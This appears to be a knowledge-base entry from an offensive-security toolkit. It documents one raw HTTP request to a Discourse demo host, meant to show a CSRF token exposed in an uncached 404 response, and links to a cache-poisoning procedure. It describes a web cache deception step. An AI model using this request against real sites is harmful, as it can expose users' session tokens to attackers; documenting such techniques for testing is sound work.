---
data: |-
  GET /u/x.css HTTP/1.1
  Host: try.discourse.org
tags:
  - http-request
  - cache-deception
type: command
executor: bash
platforms:
  - Web
id: e5f09715-e0a3-4d55-8139-1c16f4f22250
created_at: '2025-12-13T09:00:34.472Z'
updated_at: '2025-12-13T09:00:34.472Z'
verified: false
validated: true
submitted: true
---
# Request Non-Existent User Page CSS

## Command

```bash
GET /u/x.css HTTP/1.1
Host: try.discourse.org
```

## Description

Requests a non-existent user page with .css extension to demonstrate exposure of CSRF token in 404 response without cache controls.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `Host` | Target Discourse host | Yes |

## Examples

### Basic Usage

```bash
GET /u/x.css HTTP/1.1
Host: try.discourse.org
```

## Expected Output

HTTP response with <meta name="csrf-token" content="aYBW0N/1nfI1PHBa24YNx+...+BJJX+Fg==" />

## Related

- [[procedures/Taint-CloudFlare-Cache-with-Victim-Data]]
